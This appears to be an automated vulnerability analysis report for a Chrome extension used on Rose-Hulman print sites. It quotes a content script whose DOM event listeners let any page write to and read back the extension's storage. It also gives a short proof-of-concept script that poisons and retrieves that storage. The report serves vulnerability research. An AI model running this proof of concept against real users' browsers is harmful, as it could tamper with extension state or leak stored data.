# CoCo Analysis: nkdakhmklhghgjaggjbbpmhmgfbofhlo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_chromeStorageSet -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkdakhmklhghgjaggjbbpmhmgfbofhlo/opgen_generated_files/cs_0.js
Line 477: `document.addEventListener("chromeStorageSet", ({ detail }) =>`
Line 478: `chrome.storage.local.set({ print: JSON.parse(detail).data })`

**Code:**

```javascript
// Content script (scripts/expose.js) - Lines 477-489
// Entry point: DOM event listener
document.addEventListener("chromeStorageSet", ({ detail }) =>
  chrome.storage.local.set({ print: JSON.parse(detail).data }) // <- attacker-controlled data stored
);

// Retrieval path: DOM event listener
document.addEventListener("chromeStorageGet", () =>
  chrome.storage.local.get("print", (res) => {
    const data = res.print.request; // <- reads stored data
    document.dispatchEvent(
      new CustomEvent("chromeStorageCallback", {
        detail: JSON.stringify(data), // <- sends back to attacker
      })
    );
  })
);

// Alternative retrieval path: storage change listener
chrome.storage.local.onChanged.addListener((changes) => {
  const data = changes.print; // <- reads changed data
  document.dispatchEvent(
    new CustomEvent("chromeStorageRequest", { detail: JSON.stringify(data) }) // <- sends back to page
  );
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// On webpage where extension runs (print.rhit.cf or print.rose-hulman.edu:9192)

// Step 1: Poison storage with attacker data
document.dispatchEvent(new CustomEvent("chromeStorageSet", {
  detail: JSON.stringify({
    data: {
      request: "attacker_controlled_payload"
    }
  })
}));

// Step 2: Retrieve the poisoned data back
document.addEventListener("chromeStorageCallback", (event) => {
  console.log("Stolen data:", event.detail); // Contains attacker's payload
});

document.dispatchEvent(new CustomEvent("chromeStorageGet"));

// Alternative: Listen for storage changes
document.addEventListener("chromeStorageRequest", (event) => {
  console.log("Storage change:", event.detail);
});
```

**Impact:** Complete storage exploitation chain. An attacker on the whitelisted domains can poison extension storage and retrieve the data back through custom events, demonstrating both write and read access to the extension's storage mechanism. This could be used to manipulate application state or exfiltrate sensitive data stored by the extension.
